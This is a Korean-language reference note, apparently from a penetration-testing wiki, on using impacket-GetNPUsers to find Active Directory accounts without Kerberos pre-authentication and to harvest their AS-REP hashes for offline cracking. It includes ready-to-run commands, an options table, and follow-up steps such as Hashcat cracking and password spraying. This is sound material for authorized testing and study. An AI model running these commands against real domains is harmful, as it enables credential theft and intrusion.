---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 기능/자격증명수집
실행환경: ["Linux"]
필요조건: ["도메인명", "사용자 목록"]
결과: ["Kerberos hash"]
---

# impacket-GetNPUsers

## 도구 개요

`impacket-GetNPUsers`는 Kerberos 사전 인증이 비활성화된 AD 사용자를 식별하고 AS-REP hash를 요청한다. 사용자 목록을 이용한 비인증 확인과 도메인 계정을 이용한 조회를 모두 지원해 AS-REP Roasting 자료를 수집할 때 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: DC의 Kerberos에 접근 가능한 Linux 호스트
- 필요한 입력: 도메인명, DC 주소와 사용자 목록; LDAP 열거를 병행할 때는 도메인 credential
- 출력 조건: 후속 cracker에 맞춰 `-format hashcat` 또는 John 형식을 선택한다.


## 표준 사용법

```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile <users.txt> -dc-ip <DC_IP> -no-pass
```

## 대표 예시

### 사용자 목록으로 AS-REP hash 수집

```bash
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <TARGET> -no-pass -format hashcat -outputfile asrep.hashes
```

### credential로 roastable 계정 요청

```bash
impacket-GetNPUsers <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <TARGET> -request -format hashcat -outputfile asrep.hashes
```

## 주요 옵션

| 옵션 | 설명 |
|---|---|
| `-usersfile` | 확인할 사용자 목록 |
| `-no-pass` | 비밀번호 없이 AS-REQ 시도 |
| `-request` | roastable 계정의 AS-REP hash 요청 |
| `-format hashcat` | Hashcat 형식으로 출력 |
| `-outputfile` | 결과 파일 저장 |
| `-dc-ip` | 도메인 컨트롤러 IP 지정 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `$krb5asrep$` hash | AS-REP Roasting 가능 | Hashcat/John으로 cracking |
| `KDC_ERR_PREAUTH_REQUIRED` | pre-auth가 켜진 정상 계정 | Kerberoasting 또는 password spraying 검토 |
| user unknown | 사용자 목록 부정확 | kerbrute/LDAP/SMB로 사용자 후보 재정리 |
| KDC/realm 오류 | 도메인/DC/시간 문제 | realm, DC IP, DNS, 시간 확인 |
| hash 없음 | roastable 계정 없음 | LDAP에서 `DONT_REQ_PREAUTH` 여부 확인 |
| 출력 형식 오류 | cracking mode 불일치 | `-format hashcat`, hash prefix, 도구 버전 확인 |

## 관련 공격기법

- [[AS-REP Roasting]]
